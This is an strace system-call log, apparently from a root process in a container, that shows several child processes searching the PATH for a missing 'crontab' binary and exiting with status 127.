+157   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+157   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+157   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+157   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+157   newfstatat(AT_FDCWD, "/usr/local/sbin/crontab", 0x7ffe72e87170, 0) = -1 ENOENT (No such file or directory)
+157   newfstatat(AT_FDCWD, "/usr/local/bin/crontab", 0x7ffe72e87170, 0) = -1 ENOENT (No such file or directory)
+157   newfstatat(AT_FDCWD, "/usr/sbin/crontab",  <unfinished ...>
+158   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+157   <... newfstatat resumed>0x7ffe72e87170, 0) = -1 ENOENT (No such file or directory)
+157   newfstatat(AT_FDCWD, "/usr/bin/crontab", 0x7ffe72e87170, 0) = -1 ENOENT (No such file or directory)
+157   newfstatat(AT_FDCWD, "/sbin/crontab", 0x7ffe72e87170, 0) = -1 ENOENT (No such file or directory)
+157   newfstatat(AT_FDCWD, "/bin/crontab", 0x7ffe72e87170, 0) = -1 ENOENT (No such file or directory)
+158   newfstatat(AT_FDCWD, "/usr/local/sbin/crontab", 0x7ffe72e86ef0, 0) = -1 ENOENT (No such file or directory)
+158   newfstatat(AT_FDCWD, "/usr/local/bin/crontab", 0x7ffe72e86ef0, 0) = -1 ENOENT (No such file or directory)
+158   newfstatat(AT_FDCWD, "/usr/sbin/crontab", 0x7ffe72e86ef0, 0) = -1 ENOENT (No such file or directory)
+159   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666 <unfinished ...>
+158   newfstatat(AT_FDCWD, "/usr/bin/crontab",  <unfinished ...>
+159   <... openat resumed>)             = 3
+158   <... newfstatat resumed>0x7ffe72e86ef0, 0) = -1 ENOENT (No such file or directory)
+158   newfstatat(AT_FDCWD, "/sbin/crontab", 0x7ffe72e86ef0, 0) = -1 ENOENT (No such file or directory)
+158   newfstatat(AT_FDCWD, "/bin/crontab", 0x7ffe72e86ef0, 0) = -1 ENOENT (No such file or directory)
+159   newfstatat(AT_FDCWD, "/usr/local/sbin/crontab", 0x7ffe72e87000, 0) = -1 ENOENT (No such file or directory)
+159   newfstatat(AT_FDCWD, "/usr/local/bin/crontab", 0x7ffe72e87000, 0) = -1 ENOENT (No such file or directory)
+159   newfstatat(AT_FDCWD, "/usr/sbin/crontab", 0x7ffe72e87000, 0) = -1 ENOENT (No such file or directory)
+159   newfstatat(AT_FDCWD, "/usr/bin/crontab",  <unfinished ...>
+158   +++ exited with 0 +++
+159   <... newfstatat resumed>0x7ffe72e87000, 0) = -1 ENOENT (No such file or directory)
+159   newfstatat(AT_FDCWD, "/sbin/crontab", 0x7ffe72e87000, 0) = -1 ENOENT (No such file or directory)
+157   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=158, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+159   newfstatat(AT_FDCWD, "/bin/crontab", 0x7ffe72e87000, 0) = -1 ENOENT (No such file or directory)
+159   +++ exited with 127 +++
+157   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=159, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+157   +++ exited with 127 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=157, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+117   +++ exited with 0 +++
+123   +++ exited with 0 +++
